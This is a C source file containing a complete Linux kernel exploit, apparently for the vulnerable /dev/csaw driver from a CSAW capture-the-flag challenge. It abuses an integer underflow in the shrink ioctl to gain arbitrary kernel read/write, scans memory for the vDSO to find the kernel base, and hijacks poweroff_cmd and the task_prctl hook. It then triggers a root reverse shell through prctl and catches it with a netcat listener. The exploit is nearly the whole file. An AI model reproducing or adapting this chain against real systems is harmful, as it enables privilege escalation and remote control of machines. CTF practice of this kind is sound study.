// attack_prctl.c
// gcc -static -g attack_prctl.c -o attack_prctl_no_my
// add-symbol-file exp to run gdb in exp
#include <stdio.h>
#include <sys/prctl.h>       
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <malloc.h>
#include <string.h> // for memmem
#include <sys/ioctl.h>    /* BSD and Linux */
#include<unistd.h> // for getgid()
#include<stdlib.h> // for system("/bin/sh")
#include <sys/auxv.h> // for search gettimeofday()
// search string input

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8
// #define POWEROFF_CMD 0xE4DFA0
// #define ORDERLY_POWEROFF 0xa3480 

// nerwork
#define POWEROFF_CMD 0xe4dfa0
#define ORDERLY_POWEROFF 0xa3480
#define TASK_PRCTL 0xeb7DF8 


struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct grow_channel_args {
    int id;
    size_t size;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};


int get_gettimeofday_str_offset() {  
   //AT_SYSINFO_EHDR
   //        The address of a page containing the virtual Dynamic
   //        Shared Object (vDSO) that the kernel creates in order to
   //        provide fast implementations of certain system calls.
   size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);  
   char* name = "gettimeofday";  
   if (!vdso_addr) {  
      printf("[-]error get name's offset");  
      exit(-1);
   }  
   size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));  
   if (name_addr < 0) {  
      printf("[-]error get name's offset");  
      exit(-1);
   }  
   return name_addr - vdso_addr;  
} 



// create a channel
int main()
{
    setvbuf(stdout, 0LL, 2, 0LL);
    int fd = open("/dev/csaw",O_RDWR);
    if(fd<0)
    {
        printf("open /dev/csaw error\n");
        return -1;
    }
    struct alloc_channel_args alloc_args;
    struct shrink_channel_args shrink_args;
    struct seek_channel_args seek_args;
    struct read_channel_args read_args;
    struct close_channel_args close_args;
    struct write_channel_args write_args;
    size_t addr = 0xffff880000000000;
    size_t real_cred = 0;
    size_t cred = 0;
    size_t target_addr;
    size_t vdso_addr;
    int root_cred[12];
    char* local_buf = (char*)malloc(0x1000);

    // alloc one
    alloc_args.buf_size = 0x100;
    alloc_args.id = -1;
    int ret = -1;
    ret = ioctl(fd,CSAW_ALLOC_CHANNEL,&alloc_args);
    if(alloc_args.id == -1)
    {
        printf("bad alloc\n");
        return -1;
    }
    printf("[+] alloc an channel at id %d\n",alloc_args.id);
    // change its size to get arbitary write
    shrink_args.id = alloc_args.id;
    shrink_args.size = 0x100+1; // vul, shrink size is `original size - this size` si we get -1 here
    ret = ioctl(fd,CSAW_SHRINK_CHANNEL,&shrink_args);
    printf("[+] now we have arbitary read/write\n");
    
    // BEGIN OUR SEARCH
    unsigned int offset = get_gettimeofday_str_offset();
    printf("[+] get offset: %u\n", offset);

    // search in all mem
    for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {
    seek_args.id = alloc_args.id;
    seek_args.index = addr-0x10; // index is actually the begin of the place we want to search.
    seek_args.whence = SEEK_SET; // search from begin
    ret = ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
    // use channel_read to read channel's space
    read_args.buf = local_buf;
    read_args.count = 0x1000;
    read_args.id = alloc_args.id;
    ret = ioctl(fd,CSAW_READ_CHANNEL,&read_args);
    if (!strcmp(local_buf+offset,"gettimeofday")) {
        printf("[+] find vdso\n");
        vdso_addr = addr;
        printf("[+] vdso in kernel addr: 0x%lx\n",vdso_addr);
        break;
    }
    }

    size_t kernel_base = vdso_addr - 0xe04000;
    printf("[+] kernel base: 0x%lx\n",kernel_base);
    size_t poweroff_cmd_addr = kernel_base + POWEROFF_CMD;
    printf("[+] poweroff_cmd_addr=0x%lx\n",poweroff_cmd_addr);
    size_t orderly_poweroff_addr = kernel_base + ORDERLY_POWEROFF;
    printf("[+] orderly_poweroff_addr=0x%lx\n",orderly_poweroff_addr);
    size_t task_prctl_addr = kernel_base + TASK_PRCTL;
    printf("[+] task_prctl_addr=0x%lx\n",task_prctl_addr);

    // use arbitary write to hijack poweroff_cmd_addr
    char buf[0x100];
    memset(buf,'\x0',0x100);
    strcpy(buf,"/reverse_shell\0");
    seek_args.id = alloc_args.id;
    seek_args.index = poweroff_cmd_addr-0x10;
    seek_args.whence = SEEK_SET;
    ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
    write_args.id = alloc_args.id;
    write_args.buf = buf;
    write_args.count = strlen(buf);
    ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);

    //write orderly poweroff to prctl's func pointer
    memset(buf,'\0',0x100);
    *(size_t *)buf = orderly_poweroff_addr;
    seek_args.id = alloc_args.id;
    seek_args.index = task_prctl_addr-0x10;
    seek_args.whence = SEEK_SET;
    ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
    write_args.id = alloc_args.id;
    write_args.buf = buf;
    write_args.count = 0x10;
    ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);

    // now we have hijacked kernel's prctl struct
    // fork a new process to call prctl
    if (fork() == 0) { //fork一个子进程，来触发shell的反弹
      prctl(0,0);
      exit(-1);
   } else {
      printf("[+]open a shell\n");
      system("nc -l -p 2333");
   }
    }